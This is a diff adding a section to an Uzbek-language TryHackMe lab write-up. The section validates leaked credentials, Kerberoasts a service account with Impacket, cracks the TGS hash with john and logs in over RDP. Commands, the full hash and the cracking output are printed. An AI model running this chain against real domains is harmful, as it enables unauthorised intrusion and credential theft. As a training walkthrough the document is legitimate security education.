@@ -601,3 +601,55 @@ SMB         10.49.162.169   445    LAB-DC           [-] LAB.ENTERPRISE.THM\repli
 └─$ 
 ```
 Qiziq. Boshqa serverlarga ham ko'z tashlashimiz kerak.
+![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/Screenshot_2025-12-23_23_48_53.png)
+Gitubini qidirib topishimiz kerak.
+![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/Screenshot_2025-12-23_23_52_17.png)
+Topildi! Bu kishi kim ekan endi?
+![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/Screenshot_2025-12-23_23_52_17.png)
+Ana, ana! 
+Username: `nik`
+Password: `ToastyBoi`
+Topilgan credsni tekshiramiz.
+```
+┌──(me262㉿turkestan)-[~/CTF/enterprise]
+└─$ crackmapexec smb 10.49.162.169 -u nik -p 'ToastyBoi!'
+
+SMB         10.49.162.169   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.49.162.169   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! 
+```
+Ishladi! Ana endi SPN olishga harakat qilamiz.
+```
+┌──(me262㉿turkestan)-[~/CTF]
+└─$ /usr/share/doc/python3-impacket/examples/GetUserSPNs.py  lab.enterprise.thm/nik:'ToastyBoi!' -dc-ip 10.49.162.169  -request 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
+--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 06:20:01.333272  2021-04-26 20:16:41.570158             
+
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$cead6790e25cb96ae43b562e37e57f9f$302f330a47fcd6379cade109ad26e6e06acbb81b5f63aa2f2b973fac36a2830a5f13e2433a54e1c41361a347e4593fcc2cfbae0dce0aa26df4193e676862229f6998602045a5a88a8d3e560268bede820c8246a46f248465af0b17251fc3f43d17a7fde648054aa4f3ea6dd31088eaba5982e84353d84aed37d036a18468e0efb8c51ae8c54d2a11944fa54a407ff08f982c7d0d63b223b644ad0513aa8678f172688d4234bed6a721a2091b7fb2cbd5270e8ac81ca183624d7d45960364def896d0a22ec101d9decbb229479681bd87a4c7250471c1ef48ab92ccdbd2975712581b15cb1ea7697fe395e7ee6a777c7da68426196ae9beba968b299c8588a74a1f9f5cb3868aa1d3232e5e65826c1be1511875a2d03c905f7b131a50c5c9978e07bb55379cffe41bb75647767faf88278e5728dc77767578bb26ebe5e51e110d20fe17f824ad58952a0086d463a6b2108ed17fca2756d1738e2c2727cf4066a486de5081102b0e4e5f2d016c7a8c93ee5ccaf999d1cec035a1c7e56c12bb07cba058913766c8ededdfc402cb85139439b058d5b60460c080f1b678d2b43880e75d61f3c466a2964ea6762af057e18736d2f6afd5f9db34dd65f23df8c2d93c89cd7c109e7575870212acf8566bb9a7f6d858e6413f0576553241d33f9bd6a10829209ede2a418ef863715ff89839a4c1ca79afe6f00a48576239c1f1edb4e75ba8e96ba7f9cf51ec876522046f3bcfaeeae3c3d3d73c3a2b368f9bc7655618fa1edc3272ad78465887f745c6d4bfef42f4d0b67bf430b5df7d487ee4cf955883068478d659480527c85f33c905d36a2057b653b1541343b290f8db47885cef2c263e47fddd68aca2a72335564545035b3e525276577fab6e0091b375dadbccdd120395a82f0494da553fd338f88a56ca915a45bd1a22b54e127feb7a52cae23ab18577d69853a0f7b5b3a9b1d6cb2166aee6553f43400feb894d9f4fe3f983610e64a675795ce2b2f5ff5c61877289196584b22fc1706ae235e42b7464841d463c3cab89395d03dc8942c863df5b0325b4e1eb660cd763f541a79900e18733de0b530bffd2e30536842d19c1d37c995080da2365ee57b428fefc2be91a9d4fb60ef9d06b9adf72334d5cd792ea758439817cc9ff81f9fff82ba703a6824895badb3beb9be3bd37ffeb347ba87cb7b1a7cb1e01ea0ec73959670961e5a6c952fc3bab1b870322af5c24cab26ec18bf9516c9c69a82023915ee9a564c97de5c0624410e31cfcfea9a1decb5bca0681db3eeeeb1e61de452c0359edf1477dcd0cd74b18eb74f9495f980cf4206088e7f3171d7e6614c66376cad6a6ddcd0172fd2e965873
+```
+Hash olindi endi uni buzsak kifoya!
+```
+┌──(me262㉿turkestan)-[~/CTF/enterprise]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                   
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littleredbucket  (?)     
+1g 0:00:00:00 DONE (2025-12-24 00:34) 3.571g/s 5617Kp/s 5617Kc/s 5617KC/s livelife93..lindarockyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+Ana endi  bu cred bilan RDP orqali ulanamiz.
+```
+xfreerdp3 /v:10.49.162.169 /u:lab.enterprrise.thm\\bitbucket /p:littleredbucket
+```
+User flag kirishimiz bilan Desktopda turibdi.
+Flag: THM{redacted}
+
+## Privilage escalation
